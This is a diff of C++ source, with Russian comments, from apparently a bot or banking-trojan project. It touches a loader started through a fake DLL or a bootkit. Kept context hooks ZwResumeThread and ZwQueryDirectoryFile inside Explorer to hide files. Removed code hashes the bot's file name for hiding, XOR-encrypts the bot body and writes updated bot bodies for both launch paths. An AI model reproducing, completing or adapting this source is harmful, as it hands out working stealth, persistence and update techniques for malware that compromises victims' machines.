@@ -64,9 +64,6 @@ int FakeDllLenCryptKey = 0; //длина ключа шифрования тела бота
 
 //DWORD dwExplorerPid  = 0; //пид эксплорера
 
-//вычисляет хеш имяени файла в котором находится ботплаг, по этому хешу идет скрытие файла
-DWORD GetHashFileNameBotPlug();
-
 DWORD WINAPI LoaderRoutine(LPVOID Data);
 
 BOOL RunLoaderRoutine()
@@ -185,7 +182,6 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	
 	// Инициализируем систему отправки статистической информации
 	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
-	BOT::AddHiddenFile(GetHashFileNameBotPlug());
 
 	HookZwResumeThread();
 	HookZwQueryDirectoryFile();
@@ -321,7 +317,7 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 	m_memcpy( FakeDllCryptKey, cryptKey, FakeDllLenCryptKey );
 	FakeDllCryptKey[FakeDllLenCryptKey] = 0;
 
-	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s', len key: %d", cryptKey, lenCryptKey );
+	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s'", cryptKey );
 
 	if( BOT::BootkitIsRun() ) //если запущен буткит, то удаляем эту версию бота
 	{
@@ -340,56 +336,4 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 		}
 	}
 	return FALSE;
-}
-
-//обновление тела бота, запускаемого буткитом
-bool UpdateBotBootkit( BYTE* data, int c_data )
-{
-	return WriteBotForBootkit( data, c_data );
-}
-
-static void XorCryptForFakeDll(LPBYTE Key, DWORD KeySize, LPBYTE Buffer, DWORD Size)
-{
-	DWORD a = 0;
-
-	while (a < Size)
-	{
-		DWORD b = 0;
-		while (b < KeySize)
-		{
-			Buffer[a] ^= (Key[b] + (a * b));
-			b++;
-		}
-		a++;
-	}
-}
-
-//обновление тела бота запускаемого через fake.dll
-bool UpdateBotFakeDll( BYTE* data, int c_data )
-{
-	TMemory mem(c_data);
-	m_memcpy( mem.Buf(), data, c_data );
-	XorCryptForFakeDll( (BYTE*)FakeDllCryptKey, FakeDllLenCryptKey, (BYTE*)mem.Buf(), c_data );
-	if( File::WriteBufferA( FakeDllPathBot, mem.Buf(), c_data ) == c_data )
-		return true;
-	return false;
-}
-
-
-DWORD GetHashFileNameBotPlug()
-{
-	char* nameFile = 0;
-	char buf[MAX_PATH];
-	switch( BOT::GetBotType() )
-	{
-		case BotFakeDll:
-			nameFile = FakeDllPathBot;
-			break;
-		case BotBootkit:
-			nameFile = NameFileForBootkit( buf, sizeof(buf) );
-			break;
-	}
-	if( nameFile )
-		return File::GetNameHashA( nameFile, false );
-	return 0;
 }
